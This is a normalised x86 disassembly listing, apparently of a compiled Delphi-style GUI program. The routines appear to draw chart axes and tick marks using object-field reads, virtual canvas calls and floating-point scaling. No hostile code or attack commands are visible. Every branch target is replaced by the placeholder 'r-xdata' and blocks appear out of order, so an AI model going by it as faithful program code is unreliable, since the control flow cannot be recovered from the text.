mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax ]
call [ edi + 0xd8 ]
mov eax [ ebx + 0xc ]
push eax
mov eax [ esi + 0x280 ]
push eax
mov ecx [ ebx + 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
sub_47d730
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov edi [ edi + 0x8 ]
add edi 0xfffffffc
mov eax [ edi ]
mov esi [ eax + 0x90 ]
mov ebx [ esi + 0x288 ]
mov eax [ ebx + 0x10 ]
mov dl 0x1
call sub_41dae4
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x1c ]
mov eax [ edi ]
mov edx [ eax + 0x3c ]
mov eax ebx
call sub_472e8c
mov edx [ ebx + 0xc ]
mov eax esi
call sub_477f80
mov eax [ ebx + 0xc ]
call sub_41d6b8
cmp eax 0x20000000
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov esi [ eax - 0x8 ]
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0xc ]
mov edx 0x808080
call sub_41d6c0
mov eax [ edi ]
mov eax [ eax + 0x90 ]
mov eax [ eax + 0x288 ]
mov dl 0x2
mov ecx [ eax ]
call [ ecx + 0x1c ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + ebx * 4 ]
call sub_47d534
pop ecx
test ebx ebx
jle r-xdata
mov eax [ edi ]
cmp [ eax + 0x40 ] 0x0
je r-xdata
inc ebx
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + ebx * 4 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0xc ]
add eax [ edx + ebx * 4 - 0x4 ]
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fmul [ r-xdata ]
call sub_402b00
call sub_47d534
pop ecx
jmp r-xdata
sub_47d820
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov esi [ ecx + 0x90 ]
mov edi [ esi + 0x288 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0xe0 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0x8f ] 0x0
je r-xdata
mov ecx [ esi + 0x29a ]
push ecx
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x2c ]
add ecx edx
add ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
add edx [ eax + 0x2c ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
add edx [ ecx - 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0x8e ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0x8e ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x2c ]
sub esi edx
mov ecx esi
sub ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov edx esi
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xd0 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov esi [ ecx + 0x2c ]
add esi edx
mov ecx esi
add ecx [ ebp - 0x4 ]
push ecx
push 0x0
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx esi
mov edx edi
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
push eax
mov eax [ esi + 0x280 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0x2c ]
add ecx edx
add ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
add edx [ eax + 0x2c ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov ecx [ ecx + 0x2c ]
sub ecx edx
sub ecx [ ebp - 0x4 ]
push ecx
mov ecx [ esi + 0x280 ]
push ecx
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0x4 ]
mov ecx [ ecx + 0x2c ]
sub ecx edx
mov edx edi
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
sub_47d984
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ebx [ eax + 0x90 ]
mov esi [ ebx + 0x288 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
lea eax [ ebx + 0x28e ]
mov [ ebp - 0x8 ] eax
mov edx [ ebx + 0x2f4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
mov edx [ ebp - 0x8 ]
add eax [ edx + 0xc ]
mov [ ebp - 0x4 ] eax
push 0x0
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax esi
mov edi [ eax ]
call [ edi + 0xec ]
mov eax [ ebx + 0x280 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xf0 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8f ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8f ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov edx [ ebx + 0x2f4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
add eax [ edx + 0xd8 ]
push eax
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x2c ]
mov eax [ ebp + 0x8 ]
sub edx [ eax - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0xd4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xd4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0xd8 ]
push eax
mov eax [ ebx + 0x280 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0xd4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x2c ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xd4 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
add eax [ edx - 0x4 ]
push eax
push 0x0
mov edx [ ebx + 0x2f8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0xd4 ]
sub edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0xd8 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
mov eax [ ebx + 0x280 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ eax + 0xd8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0xd4 ]
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xd0 ]
jmp r-xdata
sub_47db6c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0x8e ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0xd4 ]
jle r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0xd4 ]
jle r-xdata
xor edx edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0xd8 ]
jl r-xdata
xor edx edx
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
cmp eax [ edx + 0xd8 ]
jl r-xdata
test dl dl
je r-xdata
mov dl 0x1
mov dl 0x1
jmp r-xdata
pop ebp
retn
mov edx [ ebp + 0x8 ]
cmp [ edx - 0x1 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
push edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
mov ecx [ edx + 0x74 ]
mov edx 0x1
call sub_47d820
pop ecx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
push edx
call sub_47d534
pop ecx
jmp r-xdata
sub_47dc24
push ebp
mov ebp esp
add esp 0xffffffdc
push ebx
push esi
push edi
mov [ ebp - 0x1 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
cmp [ eax - 0x8 ] 0x1
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x8 ]
dec eax
test eax eax
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ebp - 0x1c ] eax
mov edi 0x1
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0xc ]
mov edx [ edx + 0x4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0xc ]
sub edx [ ecx ]
mov [ ebp - 0x20 ] edx
fild [ ebp - 0x20 ]
fmul [ r-xdata ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx eax
inc edx
mov [ ebp - 0x24 ] edx
fild [ ebp - 0x24 ]
fdivp st1
fstp [ ebp - 0x10 ]
fwait
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
test eax eax
jle r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0xc ]
mov edx [ edx + edi * 4 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0xc ]
sub edx [ ecx + edi * 4 - 0x4 ]
mov [ ebp - 0x20 ] edx
fild [ ebp - 0x20 ]
fmul [ r-xdata ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx eax
inc edx
mov [ ebp - 0x24 ] edx
fild [ ebp - 0x24 ]
fdivp st1
fstp [ ebp - 0x10 ]
fwait
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov ebx eax
test ebx ebx
jle r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0xc ]
mov edx [ eax + edi * 4 - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47b578
fstp [ ebp - 0x18 ]
fwait
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
fild [ edx + 0x24 ]
fmul [ ebp - 0x18 ]
fsub [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x70 ]
mov edx eax
inc edx
mov [ ebp - 0x20 ] edx
fild [ ebp - 0x20 ]
fdivp st1
fstp [ ebp - 0x10 ]
fwait
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov ebx eax
test ebx ebx
jle r-xdata
mov [ ebp - 0x1c ] eax
mov edi 0x1
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov esi 0x1
fld [ ebp - 0x18 ]
fadd [ ebp - 0x10 ]
fstp [ ebp - 0x18 ]
fwait
fld [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
ja r-xdata
push ebp
mov [ ebp - 0x20 ] edi
fild [ ebp - 0x20 ]
fmul [ ebp - 0x10 ]
call sub_402b00
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax ]
sub eax ebx
call sub_47db6c
pop ecx
push ebp
mov [ ebp - 0x20 ] edi
fild [ ebp - 0x20 ]
fmul [ ebp - 0x10 ]
call sub_402b00
mov eax ebx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x8 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x8 ]
mov ecx [ ecx - 0xc ]
add eax [ ecx + edx * 4 - 0x4 ]
call sub_47db6c
pop ecx
inc edi
dec [ ebp - 0x1c ]
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x20 ] 0x0
je r-xdata
push ebp
mov [ ebp - 0x20 ] esi
fild [ ebp - 0x20 ]
fmul [ ebp - 0x10 ]
call sub_402b00
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + edi * 4 ]
pop edx
sub eax edx
call sub_47db6c
pop ecx
inc esi
dec ebx
jne r-xdata
push ebp
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47d158
call sub_47db6c
pop ecx
dec ebx
jne r-xdata
jmp r-xdata
sub_47de58
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x90 ]
mov eax [ eax + 0x288 ]
mov edx [ ebp - 0x4 ]
call sub_472e8c
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov ebx [ eax - 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor esi esi
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0xc ]
mov eax [ eax + esi * 4 ]
mov ecx [ ebp - 0x8 ]
mov edx edi
call sub_47d820
pop ecx
inc esi
dec ebx
jne r-xdata
sub_47dec8
push ebp
mov ebp esp
push ebx
mov ebx edx
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
cmp [ edx - 0x8 ] 0x0
jle r-xdata
pop ebx
pop ebp
retn
cmp [ eax + 0x21 ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx - 0x4 ]
mov edx [ edx + 0x90 ]
mov edx [ edx + 0x288 ]
xchg edx eax
call sub_472e8c
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_47dc24
pop ecx
sub_47df0c
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
mov edx [ ebx ]
mov eax [ ebx ]
mov eax [ eax + 0x90 ]
mov ecx [ eax ]
call [ ecx + 0xf8 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x28 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
push ebp
mov eax [ ebx ]
mov ecx [ eax + 0x88 ]
mov eax [ ebx ]
mov eax [ eax + 0x7c ]
mov edx 0x1
call sub_47de58
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x3c ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
mov edx eax
mov eax [ ebx ]
mov eax [ eax + 0x90 ]
mov eax [ eax + 0x288 ]
call sub_472e8c
push ebp
call sub_47d984
pop ecx
push ebp
mov eax [ ebx ]
mov ecx [ eax + 0x84 ]
neg ecx
mov eax [ ebx ]
mov eax [ eax + 0x80 ]
or edx 0xffffffff
call sub_47de58
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x78 ]
xor edx edx
call sub_47dec8
pop ecx
push ebp
mov eax [ ebx ]
mov eax [ eax + 0x6c ]
mov dl 0x1
call sub_47dec8
pop ecx
pop ebx
pop ecx
pop ebp
retn
push ebp
call sub_47d730
pop ecx
sub_47dfd8
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8c ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x90 ]
mov ebx [ esi + 0x288 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edx [ eax + 0x48 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xdc ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ eax + 0x70 ]
mov eax [ ebx + 0x10 ]
call sub_41d9c8
mov dl 0x1
mov eax [ ebx + 0x10 ]
call sub_41dae4
cmp [ esi + 0x270 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp - 0x4 ]
call sub_47dfbc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov edi [ eax + 0x5c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
mov eax [ ebx + 0x8 ]
cmp [ eax + 0x18 ] 0xffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8e ] 0x0
je r-xdata
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov ecx [ esi + 0x29a ]
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x124 ]
jmp r-xdata
xor edx edx
mov eax [ ebx + 0x8 ]
call sub_41d1d4
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x44 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x4 ]
mov edx edi
call sub_47cb78
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x44 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx edi
mov edx [ ebp - 0x4 ]
call sub_47cb78
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47e0fc
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47e223
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0xd ] 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e22a
lea eax [ ebp - 0x1c ]
mov edx 0x2
call sub_4040b8
retn
inc esi
mov [ ebp - 0x14 ] 0x0
inc [ ebp - 0x14 ]
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov al [ eax - 0x11 ]
sub al 0x3
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_4143bc
mov ebx eax
mov eax [ ebx + 0x88 ]
mov eax [ eax + 0x8 ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
lea ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_482144
mov edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_4040e8
jmp r-xdata
dec al
je r-xdata
mov esi [ ebx + 0x68 ]
cmp [ esi + 0x30a ] 0x0
je r-xdata
lea ecx [ ebp - 0x1c ]
mov edx [ ebp - 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x60 ]
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
call sub_4040e8
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl [ eax + 0x8e ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_48120c
mov eax [ ebp - 0x8 ]
fstp [ eax ]
fwait
mov [ ebp - 0xd ] 0x1
jmp r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x14 ]
call sub_4143bc
mov ecx eax
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax [ esi + 0x30c ]
call [ esi + 0x308 ]
sub_47e234
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x90 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2e8 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x94 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_483fd0
mov ebx eax
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x88 ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_483fd0
mov edx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_414210
sub_47e2bc
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ eax ] 0xffffffff
mov [ esi ] 0xffffffff
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edi [ eax + 0x8 ]
dec edi
test edi edi
jl r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc edi
mov [ ebp - 0x8 ] 0x0
cmp [ esi ] 0xffffffff
je r-xdata
mov eax [ ebx + 0x4c ]
cmp eax 0xffffffff
je r-xdata
mov eax [ ebx + 0x5c ]
mov [ esi ] eax
mov eax [ esi ]
cmp eax [ ebx + 0x5c ]
jge r-xdata
mov edx [ ebp - 0x4 ]
cmp eax [ edx ]
jge r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4143bc
mov ebx eax
mov eax ebx
call sub_4812b8
mov eax [ ebp - 0x4 ]
cmp [ eax ] 0xffffffff
jne r-xdata
inc [ ebp - 0x8 ]
dec edi
jne r-xdata
mov edx [ ebp - 0x4 ]
mov [ edx ] eax
sub_47e348
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
xor eax eax
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_47e56d
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403314
mov edx [ ebp + 0x8 ]
mov [ edx - 0x10 ] eax
mov eax [ ebp + 0x8 ]
push eax
call sub_47e234
pop ecx
mov eax [ ebp + 0x8 ]
push eax
lea edx [ ebp - 0xc ]
lea eax [ ebp - 0x8 ]
call sub_47e2bc
pop ecx
cmp [ ebp - 0x8 ] 0xffffffff
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_403344
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e574
lea eax [ ebp - 0x10 ]
call sub_404094
retn
mov [ ebp - 0x1c ] 0xffffffff
xor eax eax
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov al [ eax + 0x8e ]
mov [ ebp - 0x25 ] al
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x44 ]
sub eax 0x5a
je r-xdata
mov al [ ebp - 0x25 ]
xor al 0x1
mov [ ebp - 0x25 ] al
sub eax 0xb4
jne r-xdata
inc ebx
mov esi [ ebp - 0x8 ]
mov ebx [ ebp - 0xc ]
sub ebx esi
jl r-xdata
inc esi
dec ebx
jne r-xdata
fld [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fcomp [ eax + 0xb8 ]
fnstsw ax
sahf
jb r-xdata
mov eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x10 ]
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_47e0fc
pop ecx
test al al
je r-xdata
fld [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
fcomp [ eax + 0xb0 ]
fnstsw ax
sahf
ja r-xdata
push [ ebp - 0x14 ]
push [ ebp - 0x18 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_47d158
mov edi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x8c ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax edi
call sub_47dfbc
pop ecx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x90 ]
mov edx [ eax + 0x288 ]
mov [ ebp - 0x2c ] edx
